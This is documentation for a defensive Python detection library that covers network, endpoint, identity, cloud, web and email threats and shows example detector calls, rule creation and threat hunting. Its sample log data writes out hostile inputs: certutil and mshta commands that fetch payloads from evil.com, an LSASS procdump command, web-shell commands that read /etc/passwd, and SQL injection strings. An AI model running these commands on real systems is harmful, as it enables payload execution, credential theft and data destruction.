---
name: detection
description: |
  Security detection use cases for identifying threats across network, endpoint,
  identity, cloud, application, and email vectors. Use for building detection
  rules, analyzing security events, and threat hunting operations.
license: Apache-2.0
compatibility: |
  - Python 3.9+
  - No external dependencies (standard library only)
metadata:
  author: SherifEldeeb
  version: "1.0.0"
  category: cybersecurity
---

# Detection Use Cases Skill

Comprehensive detection capabilities for identifying security threats across all attack vectors. Supports rule creation, event analysis, and threat hunting workflows.

## Capabilities

- **Network Detections**: Port scanning, DNS tunneling, beaconing, lateral movement, exfiltration
- **Endpoint Detections**: Malware, ransomware, process injection, credential dumping, persistence
- **Identity Detections**: Brute force, credential stuffing, impossible travel, privilege abuse
- **Cloud Detections**: Resource hijacking, IAM abuse, cryptomining, container escape
- **Application Detections**: SQL injection, XSS, web shells, API abuse
- **Email Detections**: Phishing, BEC, malicious attachments
- **Detection Rule Management**: Create, test, and tune detection rules

## Quick Start

```python
from detection_utils import (
    NetworkDetector, EndpointDetector, IdentityDetector,
    CloudDetector, ApplicationDetector, EmailDetector,
    DetectionRule, ThreatHunter
)

# Network detection
network = NetworkDetector()
result = network.detect_beaconing(conn_logs)

# Endpoint detection
endpoint = EndpointDetector()
result = endpoint.detect_credential_dumping(process_events)

# Create detection rule
rule = DetectionRule(
    name='Suspicious PowerShell Execution',
    category='endpoint',
    severity='High'
)
rule.add_condition('process_name', 'equals', 'powershell.exe')
rule.add_condition('command_line', 'contains', '-encodedcommand')
print(rule.to_sigma())
```

## Usage

### Network Detection: Port Scanning

Detect reconnaissance through port scanning activity.

**Example**:
```python
from detection_utils import NetworkDetector

detector = NetworkDetector()

# Analyze connection logs for scanning
conn_logs = [
    {'src_ip': '192.168.1.100', 'dst_ip': '10.0.0.5', 'dst_port': 22, 'timestamp': '2024-01-15 10:00:01'},
    {'src_ip': '192.168.1.100', 'dst_ip': '10.0.0.5', 'dst_port': 23, 'timestamp': '2024-01-15 10:00:01'},
    {'src_ip': '192.168.1.100', 'dst_ip': '10.0.0.5', 'dst_port': 80, 'timestamp': '2024-01-15 10:00:02'},
    # ... many more ports in short time
]

result = detector.detect_port_scan(conn_logs, threshold=50, time_window=60)
if result['detected']:
    print(f"Port scan detected from {result['source_ip']}")
    print(f"Ports scanned: {result['port_count']}")
    print(f"Scan type: {result['scan_type']}")  # horizontal, vertical, or block
```

### Network Detection: DNS Tunneling

Detect data exfiltration via DNS.

**Example**:
```python
from detection_utils import NetworkDetector

detector = NetworkDetector()

dns_queries = [
    {'query': 'aGVsbG8gd29ybGQ.evil.com', 'query_type': 'TXT', 'timestamp': '2024-01-15 10:00:00'},
    {'query': 'dGhpcyBpcyBkYXRh.evil.com', 'query_type': 'TXT', 'timestamp': '2024-01-15 10:00:01'},
]

result = detector.detect_dns_tunneling(dns_queries)
if result['detected']:
    print(f"DNS tunneling detected to: {result['tunnel_domain']}")
    print(f"Indicators: {result['indicators']}")
    # High entropy subdomains, unusual query types, query frequency
```

### Network Detection: C2 Beaconing

Detect command and control communication patterns.

**Example**:
```python
from detection_utils import NetworkDetector

detector = NetworkDetector()

# Network connections over time
connections = [
    {'dst_ip': '198.51.100.1', 'dst_port': 443, 'bytes': 256, 'timestamp': '2024-01-15 10:00:00'},
    {'dst_ip': '198.51.100.1', 'dst_port': 443, 'bytes': 260, 'timestamp': '2024-01-15 10:05:00'},
    {'dst_ip': '198.51.100.1', 'dst_port': 443, 'bytes': 252, 'timestamp': '2024-01-15 10:10:00'},
    # Regular interval pattern...
]

result = detector.detect_beaconing(connections, jitter_threshold=0.2)
if result['detected']:
    print(f"Beaconing detected to {result['destination']}")
    print(f"Interval: {result['interval_seconds']}s (jitter: {result['jitter']}%)")
    print(f"Confidence: {result['confidence']}")
```

### Network Detection: Lateral Movement

Detect internal network traversal.

**Example**:
```python
from detection_utils import NetworkDetector

detector = NetworkDetector()

internal_traffic = [
    {'src_ip': '10.0.1.50', 'dst_ip': '10.0.2.100', 'dst_port': 445, 'service': 'SMB'},
    {'src_ip': '10.0.1.50', 'dst_ip': '10.0.2.101', 'dst_port': 445, 'service': 'SMB'},
    {'src_ip': '10.0.1.50', 'dst_ip': '10.0.2.102', 'dst_port': 3389, 'service': 'RDP'},
]

result = detector.detect_lateral_movement(
    internal_traffic,
    baseline_connections={'10.0.1.50': ['10.0.2.100']}
)
if result['detected']:
    print(f"Lateral movement from {result['source']}")
    print(f"New destinations: {result['new_destinations']}")
    print(f"Protocols used: {result['protocols']}")
```

### Network Detection: Data Exfiltration

Detect unusual data transfers.

**Example**:
```python
from detection_utils import NetworkDetector

detector = NetworkDetector()

transfers = [
    {'src_ip': '10.0.1.50', 'dst_ip': '203.0.113.50', 'bytes_out': 500000000, 'protocol': 'HTTPS'},
]

result = detector.detect_exfiltration(
    transfers,
    baseline_bytes={'10.0.1.50': 1000000},  # Normal: 1MB/day
    threshold_multiplier=100
)
if result['detected']:
    print(f"Exfiltration detected: {result['bytes_transferred']} bytes")
    print(f"Destination: {result['destination']}")
    print(f"Anomaly score: {result['anomaly_score']}")
```

### Endpoint Detection: Malware Behavior

Detect malware through behavioral analysis.

**Example**:
```python
from detection_utils import EndpointDetector

detector = EndpointDetector()

process_events = [
    {
        'process_name': 'suspicious.exe',
        'parent_process': 'explorer.exe',
        'command_line': 'suspicious.exe -hidden',
        'file_writes': ['/temp/payload.dll'],
        'registry_writes': ['HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'],
        'network_connections': [{'dst_ip': '198.51.100.1', 'dst_port': 443}]
    }
]

result = detector.detect_malware_behavior(process_events)
if result['detected']:
    print(f"Malware behavior detected: {result['process']}")
    print(f"Indicators: {result['indicators']}")
    print(f"MITRE ATT&CK: {result['mitre_techniques']}")
```

### Endpoint Detection: Ransomware

Detect ransomware encryption activity.

**Example**:
```python
from detection_utils import EndpointDetector

detector = EndpointDetector()

file_events = [
    {'operation': 'read', 'path': '/documents/file1.docx', 'timestamp': '2024-01-15 10:00:00'},
    {'operation': 'write', 'path': '/documents/file1.docx.encrypted', 'timestamp': '2024-01-15 10:00:01'},
    {'operation': 'delete', 'path': '/documents/file1.docx', 'timestamp': '2024-01-15 10:00:01'},
    # Mass file operations...
]

result = detector.detect_ransomware(file_events, threshold=100, time_window=60)
if result['detected']:
    print(f"Ransomware detected!")
    print(f"Files affected: {result['file_count']}")
    print(f"Encryption pattern: {result['pattern']}")
    print(f"Ransom note: {result['ransom_note_path']}")
```

### Endpoint Detection: Credential Dumping

Detect credential theft attempts.

**Example**:
```python
from detection_utils import EndpointDetector

detector = EndpointDetector()

process_events = [
    {
        'process_name': 'procdump.exe',
        'command_line': 'procdump.exe -ma lsass.exe',
        'target_process': 'lsass.exe',
        'access_rights': 'PROCESS_ALL_ACCESS'
    }
]

result = detector.detect_credential_dumping(process_events)
if result['detected']:
    print(f"Credential dumping detected!")
    print(f"Technique: {result['technique']}")  # LSASS dump, SAM access, etc.
    print(f"Tool indicators: {result['tool_indicators']}")
```

### Endpoint Detection: Persistence Mechanisms

Detect attacker persistence.

**Example**:
```python
from detection_utils import EndpointDetector

detector = EndpointDetector()

system_changes = [
    {'type': 'registry', 'path': 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'value': 'malware.exe'},
    {'type': 'scheduled_task', 'name': 'SystemUpdate', 'action': 'C:\\Windows\\Temp\\payload.exe'},
    {'type': 'service', 'name': 'WindowsUpdateSvc', 'binary': 'C:\\Windows\\Temp\\svc.exe'},
]

result = detector.detect_persistence(system_changes)
if result['detected']:
    print(f"Persistence mechanisms detected: {len(result['mechanisms'])}")
    for mech in result['mechanisms']:
        print(f"  - {mech['type']}: {mech['details']}")
```

### Endpoint Detection: Living-off-the-Land Binaries

Detect LOLBin abuse.

**Example**:
```python
from detection_utils import EndpointDetector

detector = EndpointDetector()

process_events = [
    {
        'process_name': 'certutil.exe',
        'command_line': 'certutil.exe -urlcache -split -f http://evil.com/payload.exe',
        'parent_process': 'cmd.exe'
    },
    {
        'process_name': 'mshta.exe',
        'command_line': 'mshta.exe http://evil.com/script.hta',
        'parent_process': 'excel.exe'
    }
]

result = detector.detect_lolbin_abuse(process_events)
if result['detected']:
    for detection in result['detections']:
        print(f"LOLBin abuse: {detection['binary']}")
        print(f"Suspicious args: {detection['suspicious_args']}")
        print(f"MITRE technique: {detection['mitre_technique']}")
```

### Identity Detection: Brute Force

Detect password guessing attacks.

**Example**:
```python
from detection_utils import IdentityDetector

detector = IdentityDetector()

auth_logs = [
    {'user': 'admin', 'result': 'failure', 'source_ip': '192.168.1.100', 'timestamp': '2024-01-15 10:00:00'},
    {'user': 'admin', 'result': 'failure', 'source_ip': '192.168.1.100', 'timestamp': '2024-01-15 10:00:01'},
    # Many failures followed by success...
    {'user': 'admin', 'result': 'success', 'source_ip': '192.168.1.100', 'timestamp': '2024-01-15 10:05:00'},
]

result = detector.detect_brute_force(auth_logs, failure_threshold=10, time_window=300)
if result['detected']:
    print(f"Brute force attack on {result['target_user']}")
    print(f"Failures: {result['failure_count']}")
    print(f"Source: {result['source_ip']}")
    print(f"Attack successful: {result['compromised']}")
```

### Identity Detection: Impossible Travel

Detect geographic anomalies in logins.

**Example**:
```python
from detection_utils import IdentityDetector

detector = IdentityDetector()

login_events = [
    {'user': 'jdoe', 'location': 'New York, US', 'timestamp': '2024-01-15 10:00:00', 'ip': '198.51.100.1'},
    {'user': 'jdoe', 'location': 'Tokyo, JP', 'timestamp': '2024-01-15 10:30:00', 'ip': '203.0.113.50'},
]

result = detector.detect_impossible_travel(login_events, max_speed_kmh=1000)
if result['detected']:
    print(f"Impossible travel for {result['user']}")
    print(f"Distance: {result['distance_km']} km in {result['time_minutes']} minutes")
    print(f"Required speed: {result['required_speed_kmh']} km/h")
```

### Identity Detection: Kerberoasting

Detect Kerberos service ticket attacks.

**Example**:
```python
from detection_utils import IdentityDetector

detector = IdentityDetector()

kerberos_events = [
    {'user': 'attacker', 'event_type': 'TGS_REQ', 'service': 'MSSQLSvc/db01', 'encryption': 'RC4'},
    {'user': 'attacker', 'event_type': 'TGS_REQ', 'service': 'HTTP/web01', 'encryption': 'RC4'},
    {'user': 'attacker', 'event_type': 'TGS_REQ', 'service': 'LDAP/dc01', 'encryption': 'RC4'},
]

result = detector.detect_kerberoasting(kerberos_events, request_threshold=5, time_window=60)
if result['detected']:
    print(f"Kerberoasting detected by {result['user']}")
    print(f"Service tickets requested: {result['ticket_count']}")
    print(f"Targeted services: {result['services']}")
```

### Cloud Detection: IAM Abuse

Detect suspicious IAM activity.

**Example**:
```python
from detection_utils import CloudDetector

detector = CloudDetector()

cloudtrail_events = [
    {'event': 'CreateUser', 'user': 'compromised-user', 'target': 'backdoor-admin'},
    {'event': 'AttachUserPolicy', 'user': 'compromised-user', 'policy': 'AdministratorAccess'},
    {'event': 'CreateAccessKey', 'user': 'compromised-user', 'target': 'backdoor-admin'},
]

result = detector.detect_iam_abuse(cloudtrail_events)
if result['detected']:
    print(f"IAM abuse detected by {result['actor']}")
    print(f"Suspicious actions: {result['actions']}")
    print(f"Risk level: {result['risk_level']}")
```

### Cloud Detection: Cryptomining

Detect cloud resource abuse for mining.

**Example**:
```python
from detection_utils import CloudDetector

detector = CloudDetector()

resource_events = [
    {'event': 'RunInstances', 'instance_type': 'p3.16xlarge', 'count': 10, 'region': 'us-east-1'},
    {'event': 'RunInstances', 'instance_type': 'p3.16xlarge', 'count': 10, 'region': 'us-west-2'},
]

result = detector.detect_cryptomining(resource_events)
if result['detected']:
    print(f"Cryptomining detected!")
    print(f"GPU instances: {result['gpu_instance_count']}")
    print(f"Estimated cost/hour: ${result['estimated_hourly_cost']}")
    print(f"Regions: {result['regions']}")
```

### Application Detection: SQL Injection

Detect SQL injection attempts.

**Example**:
```python
from detection_utils import ApplicationDetector

detector = ApplicationDetector()

web_requests = [
    {'url': '/search', 'params': {'q': "'; DROP TABLE users;--"}, 'method': 'GET'},
    {'url': '/login', 'params': {'user': "admin'--", 'pass': 'x'}, 'method': 'POST'},
]

result = detector.detect_sql_injection(web_requests)
if result['detected']:
    for attack in result['attacks']:
        print(f"SQLi attempt: {attack['payload']}")
        print(f"Pattern: {attack['pattern']}")
        print(f"Endpoint: {attack['endpoint']}")
```

### Application Detection: Web Shells

Detect web shell uploads and access.

**Example**:
```python
from detection_utils import ApplicationDetector

detector = ApplicationDetector()

web_logs = [
    {'url': '/uploads/shell.php', 'params': {'cmd': 'whoami'}, 'response_size': 50},
    {'url': '/images/logo.php', 'params': {'c': 'cat /etc/passwd'}, 'response_size': 2000},
]

result = detector.detect_webshell(web_logs)
if result['detected']:
    print(f"Web shell detected: {result['path']}")
    print(f"Commands executed: {result['commands']}")
    print(f"Indicators: {result['indicators']}")
```

### Email Detection: Phishing

Detect phishing emails.

**Example**:
```python
from detection_utils import EmailDetector

detector = EmailDetector()

emails = [
    {
        'from': 'security@micros0ft.com',
        'subject': 'Urgent: Password Reset Required',
        'body': 'Click here to reset your password: http://evil.com/reset',
        'links': ['http://evil.com/reset'],
        'attachments': []
    }
]

result = detector.detect_phishing(emails)
if result['detected']:
    print(f"Phishing email detected!")
    print(f"Sender impersonation: {result['impersonation']}")
    print(f"Suspicious links: {result['suspicious_links']}")
    print(f"Urgency indicators: {result['urgency_score']}")
```

### Detection Rule Management

Create and manage detection rules.

**Example**:
```python
from detection_utils import DetectionRule, DetectionRuleSet

# Create a detection rule
rule = DetectionRule(
    name='Mimikatz Execution',
    category='endpoint',
    severity='Critical',
    description='Detects Mimikatz credential dumping tool'
)

# Add conditions
rule.add_condition('process_name', 'equals', 'mimikatz.exe')
rule.add_condition('command_line', 'contains', 'sekurlsa')

# Add MITRE mapping
rule.add_mitre_mapping('T1003.001', 'Credential Dumping: LSASS Memory')

# Export formats
print(rule.to_sigma())   # SIGMA format
print(rule.to_kql())     # Kusto Query Language
print(rule.to_splunk())  # Splunk SPL

# Rule set management
ruleset = DetectionRuleSet('Credential Theft Detections')
ruleset.add_rule(rule)
ruleset.export_all('/rules')
```

### Threat Hunting

Proactive threat hunting workflows.

**Example**:
```python
from detection_utils import ThreatHunter, HuntHypothesis

# Create a hunt
hunter = ThreatHunter('HUNT-2024-001', 'Detecting Cobalt Strike')

# Define hypothesis
hypothesis = HuntHypothesis(
    name='Cobalt Strike Beacon Detection',
    description='Hunt for Cobalt Strike beacons using network and endpoint data',
    mitre_techniques=['T1071.001', 'T1059.001']
)

# Add data sources
hypothesis.add_data_source('network_logs', 'Proxy and firewall logs')
hypothesis.add_data_source('process_events', 'EDR process telemetry')

# Add hunt queries
hypothesis.add_query(
    'network',
    'connections with regular intervals to unknown destinations',
    'dst_ip NOT IN known_good AND interval_stddev < 10'
)

hunter.add_hypothesis(hypothesis)

# Document findings
hunter.add_finding(
    hypothesis='Cobalt Strike Beacon Detection',
    description='Found beaconing to 198.51.100.1 every 60 seconds',
    evidence=['network_log_123', 'process_event_456'],
    severity='Critical'
)

# Generate report
print(hunter.generate_report())
```

## Configuration

### Detection Thresholds

| Detection | Parameter | Default | Description |
|-----------|-----------|---------|-------------|
| Port Scan | `threshold` | 50 | Ports per time window |
| Port Scan | `time_window` | 60 | Seconds |
| Beaconing | `jitter_threshold` | 0.2 | Max acceptable jitter |
| Brute Force | `failure_threshold` | 10 | Failed attempts |
| Ransomware | `file_threshold` | 100 | Files modified |

### Environment Variables

| Variable | Description | Required | Default |
|----------|-------------|----------|---------|
| `DETECTION_LOG_LEVEL` | Logging verbosity | No | `INFO` |
| `DETECTION_BASELINE_PATH` | Path to baseline data | No | `./baselines` |

## Limitations

- **No Real-time Processing**: Designed for batch analysis, not streaming
- **No Built-in Data Collection**: Requires pre-collected log data
- **Baseline Generation**: Baselines must be provided or generated separately
- **Geo-IP Data**: Requires external geo-IP database for location features

## Troubleshooting

### High False Positives

**Problem**: Too many false positive detections

**Solution**: Adjust thresholds and provide accurate baselines:
```python
detector = NetworkDetector()
result = detector.detect_port_scan(logs, threshold=100)  # Increase threshold
```

### Missing Detections

**Problem**: Known malicious activity not detected

**Solution**: Review detection parameters and ensure complete log data:
```python
# Ensure time windows align with attack patterns
result = detector.detect_beaconing(logs, time_window=3600)  # Longer window
```

## Related Skills

- [incident-response](../incident-response/): Respond to detected threats
- [threat-intelligence](../threat-intelligence/): IOC correlation
- [soc-operations](../soc-operations/): Alert triage workflows
- [containment](../containment/): Contain detected threats

## References

- [Detailed API Reference](references/REFERENCE.md)
- [MITRE ATT&CK](https://attack.mitre.org/)
- [SIGMA Rules](https://github.com/SigmaHQ/sigma)
